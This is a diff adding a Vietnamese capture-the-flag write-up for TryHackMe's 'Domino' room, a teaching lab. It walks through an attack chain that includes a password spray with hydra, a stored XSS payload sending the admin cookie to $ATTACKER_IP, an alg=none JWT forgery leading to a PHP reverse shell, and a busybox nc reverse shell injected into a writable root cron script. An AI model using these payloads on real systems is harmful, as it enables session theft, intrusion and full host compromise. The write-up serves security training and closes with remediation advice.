@@ -1,0 +1,199 @@
+---
+title: 'Domino'
+description: 'Chuỗi web năm tầng trên NexusCorp Portal: liệt kê user, đăng nhập bằng mật khẩu yếu, trộm cookie admin qua stored XSS, giả mạo JWT alg=none thành RCE www-data, dùng lại mật khẩu DB bị lộ để sang devops, rồi lợi dụng cron root ghi được để lên root.'
+date: 2026-06-22
+platform: tryhackme
+room: 'Domino'
+roomUrl: 'https://tryhackme.com/room/domino'
+difficulty: medium
+tags:
+  - 'web'
+  - 'php'
+  - 'stored-xss'
+  - 'cookie-theft'
+  - 'session-hijacking'
+  - 'jwt'
+  - 'rce'
+  - 'crypto'
+  - 'linux'
+  - 'privesc'
+vulnClasses:
+  - 'stored cross-site scripting'
+  - 'session cookie theft'
+  - 'hardcoded credentials'
+  - 'authentication bypass'
+  - 'weak credentials'
+  - 'password reuse'
+  - 'writable scheduled task'
+translation: done
+draft: false
+---
+
+_Hướng dẫn giải phòng "Domino" trên TryHackMe. NexusCorp Portal đổ như một hàng domino: một bí mật lộ ở client và mật khẩu yếu đưa ta vào, một stored XSS trộm cookie admin, một JWT_ _`alg=none`_ _giả mạo biến tính năng file của admin thành RCE, một mật khẩu database dùng lại đưa ta sang ngang tới một user thật, và một cron root ghi được kết thúc mọi thứ._
+
+> Domino là một challenge huấn luyện hợp pháp trên TryHackMe; mọi thao tác ở đây đều thực hiện trên mục tiêu luyện tập được cấp phép. Cả năm flag, các khóa bị lộ và mọi credential khôi phục được đều hiển thị dưới dạng `THM{<redacted>}` / `<redacted>` — có thật trên máy, giấu đi ở đây.
+
+---
+
+### **TL;DR**
+
+<Callout type="tldr">
+
+Thu thập email nhân viên từ `team.php` để dựng danh sách user → `static/app.js` làm lộ một **khóa backup AES-ECB hardcoded** và thiết kế JWT/session → brute-force form login và ba tài khoản dùng mật khẩu tầm thường → cookie session **không có** **`HttpOnly`**, nên một **stored XSS** trong ticket rút trộm cookie `nexus_session` của admin → replay nó để vào admin panel và lấy **flag 3** → bộ kiểm tra JWT chấp nhận **`alg=none`**, nên giả mạo một token admin và lạm dụng tính năng file-include để có **RCE dưới www-data** (flag) → `config.php` làm lộ một mật khẩu DB bị **dùng lại** cho user `devops` (flag) → một cron root chạy `health_report.sh` **ghi được theo nhóm**, chèn reverse shell để lên **root** (flag).
+
+</Callout>
+
+### **Mục tiêu**
+
+```text
+export IP=<target-ip>
+export ATTACKER_IP=<your-ip>
+```
+
+`nmap` chỉ thấy SSH và một site Apache/PHP — "NexusCorp Portal":
+
+```text
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
+80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))  # NexusCorp Portal
+```
+
+### **Lỗ hổng**
+
+Domino là một chồng lỗi web mang tính giảng dạy, xếp lớp lên nhau: bí mật đưa xuống trình duyệt, mật khẩu sống sót qua một từ điển, một cookie đọc được từ JavaScript, một bộ xác minh JWT tin tưởng kẻ tấn công, và một script cron đặc quyền mà user quyền thấp sửa được.
+
+<Callout type="insight">
+
+Hai lỗ hổng broken-authentication gánh phần nặng. Thứ nhất, cookie session thiếu `HttpOnly`, biến một stored XSS thông thường thành **trộm toàn bộ session**. Thứ hai, quá trình xác minh JWT chấp nhận header **`alg=none`** — nghĩa là một token _không có chữ ký_ vẫn được coi là hợp lệ, nên bạn chỉ cần tự khai mình là admin. Cả hai đều không cần crack bí mật nào; đều là lỗi logic.
+
+</Callout>
+
+### **Bước 1 — dựng danh sách user và đọc bí mật ở client**
+
+Trang team công khai liệt kê email nhân viên; rút gọn thành username:
+
+```text
+curl -s http://$IP/team.php | grep -o 'mailto:[^\">]*' | cut -d ':' -f2 > emails.txt
+cut -d '@' -f1 emails.txt > users.txt
+```
+
+Trang quên mật khẩu trả về thông báo khác nhau cho tài khoản hợp lệ và không hợp lệ (**username enumeration** kinh điển), xác nhận danh sách. Một lượt quét thư mục sau đó lộ ra các đường dẫn đáng chú ý:
+
+```text
+gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirb/big.txt -t 100
+# admin/  api/  backup/  static/  support/ ...
+```
+
+Đọc `static/app.js` là mỏ vàng: nó hardcode khóa mã hóa backup-config và phơi bày thiết kế xác thực (một blob **AES-128-ECB**, cùng `nexus_session` và `nexus_jwt` do `/api/auth/token.php` cấp):
+
+```text
+// leaked in static/app.js
+backupKey: '<redacted-backup-key>'   // AES-128-ECB
+```
+
+Có khóa trong tay, `config.enc` giải mã sạch sẽ (14 ký tự ASCII của khóa + 2 byte null = khóa AES 16 byte):
+
+```text
+python3 decrypt_config.py config.enc
+# {"app_name":"NexusCorp Portal","version":"2.3.1","deploy_env":"production","system_user":"devops"}
+```
+
+### **Bước 2 — đăng nhập bằng mật khẩu yếu**
+
+Spray danh sách username vào form login với một danh sách mật khẩu phổ biến cho ra ba kết quả — đều dùng cùng một từ điển tầm thường:
+
+```text
+hydra -L users.txt -P xato-net-10-million-passwords-10000.txt $IP \
+  http-post-form '/index.php:username=^USER^&password=^PASS^:Invalid credentials' -I
+# sarah.johnson / robert.wilson / emma.taylor  -> <redacted weak password>
+```
+
+Sau khi đăng nhập, dashboard để lộ một hệ thống ticket và một trình xem file dựa trên API, cần một JWT từ `/api/auth/token.php`.
+
+### **Bước 3 — stored XSS → trộm cookie admin (flag)**
+
+Cookie session được cấp mà không có `HttpOnly`, nên JavaScript đọc được nó. Ta gửi một ticket có nội dung là payload XSS; khi admin bot mở nó, cookie bị beacon về ta:
+
+```text
+<body onload="new Image().src='http://$ATTACKER_IP/?c='+document.cookie;">
+```
+
+Một listener đơn giản bắt được `nexus_session` của admin (base64-decode ra `{"user_id":1,"username":"laura.hayes","role":"admin"}` kèm đuôi HMAC). Thay cookie của ta bằng nó và admin panel mở ra — chứa flag đầu tiên:
+
+```text
+THM{<redacted>}
+```
+
+### **Bước 4 — giả mạo JWT** **`alg=none`** **→ RCE www-data (flag)**
+
+Tính năng file cần một JWT. Bộ xác minh chấp nhận thuật toán `none`, nên ta dựng một token không chữ ký khai báo vai trò admin — không cần bí mật — và gửi qua `Authorization: Bearer`. Bộ xử lý include sau đó thực thi PHP từ xa, và điểm mấu chốt là nó thực thi PHP **kể cả khi không có thẻ** **`<?php ?>`**. Ta host một reverse shell và được thực thi:
+
+```text
+# attacker
+php -S 0.0.0.0:80      # serving shell.php (pentestmonkey reverse shell)
+nc -lvnp 4444
+```
+
+```text
+# caught
+uid=33(www-data) gid=33(www-data)
+www-data@tryhackme-2404:/opt$ cat flag3.txt
+THM{<redacted>}
+```
+
+### **Bước 5 — dùng lại mật khẩu DB → devops (flag)**
+
+`config.php` trong web root làm lộ bí mật của ứng dụng, gồm một mật khẩu database. Chính mật khẩu đó dùng được cho user local `devops` (đã xác nhận có trong `/etc/passwd`, và đã được báo trước bởi `system_user: devops` trong config giải mã được):
+
+```text
+www-data@...:/var/www/html$ cat config.php
+# DB_PASS = '<redacted>'   JWT_SECRET / APP_SECRET cũng có mặt
+www-data@...:/opt$ su devops    # cùng mật khẩu -> thành công
+devops@...:~$ cat user.txt
+THM{<redacted>}
+```
+
+### **Bước 6 — cron root ghi được → root (flag)**
+
+`devops` không sudo được, nhưng `pspy` cho thấy root chạy một script giám sát theo lịch:
+
+```text
+CMD: UID=0  PID=1902 | /bin/bash /opt/monitoring/health_report.sh
+```
+
+Script thuộc sở hữu của root nhưng **ghi được bởi nhóm** **`devops`** (`-rwxrwxr-- root devops`). Ta chèn một reverse shell và chờ nhịp chạy kế tiếp:
+
+```text
+echo 'busybox nc $ATTACKER_IP 4445 -e /bin/bash' >> /opt/monitoring/health_report.sh
+# attacker: nc -lvnp 4445  ->  uid=0(root)
+root@...:~# cat /root/root.txt
+THM{<redacted>}
+```
+
+### **Tác động**
+
+<Callout type="critical">
+
+**Nghiêm trọng — CVSS 3.1 \~9.8** (`AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`). Một kẻ tấn công chưa xác thực kết chuỗi việc lộ bí mật ở client, mật khẩu yếu, cookie session không `HttpOnly` (trộm session qua stored-XSS), và bypass JWT `alg=none` thành thực thi mã từ xa. Việc dùng lại credential và một cron root ghi được theo nhóm sau đó leo thang từ user web lên root đầy đủ — xâm phạm hoàn toàn host và mọi dữ liệu ứng dụng.
+
+</Callout>
+
+### **Khuyến nghị khắc phục**
+
+<Callout type="fix">
+
+- **Không bao giờ đưa bí mật xuống trình duyệt.** Khóa backup AES trong `app.js` và toàn bộ thiết kế xác thực chỉ nên nằm ở server.
+- **Đặt** **`HttpOnly`** **(và** **`Secure`\*\***,\*\* **`SameSite`\*\***) cho cookie session\*\*, và encode/escape mọi nội dung ticket do người dùng nhập để diệt stored XSS.
+- **Cố định thuật toán JWT.** Từ chối `none` và mọi thuật toán khác ngoài cái bạn cấp; xác minh chữ ký bằng khóa giữ ở server.
+- **Ép mật khẩu mạnh, duy nhất** và ngừng dùng lại mật khẩu DB cho tài khoản hệ điều hành.
+- **Sửa quyền file của các script cron đặc quyền** — script chạy bởi root không được phép ghi bởi nhóm non-root.
+
+</Callout>
+
+### **Bài học rút ra**
+
+- **Mọi thứ trong JS ở client đều là công khai.** Một khóa hardcoded hay một thiết kế xác thực bị phơi bày là món quà cho kẻ tấn công.
+- **`HttpOnly`** **là thứ đứng giữa một XSS và việc chiếm session.** Thiếu nó, một payload stored là kết thúc cuộc chơi.
+- **`alg=none`** **là một cánh cửa không chữ ký.** Một thư viện JWT tôn trọng nó sẽ tin bất cứ điều gì client khai báo.
+- **Leo thang đặc quyền thường chỉ là một lỗi gõ quyền** — một cron root cách root đúng một bit ghi theo nhóm.
+
+Domino đúng với cái tên của nó: mỗi mắt xích yếu làm đổ mắt tiếp theo. Cảm ơn đã đọc.
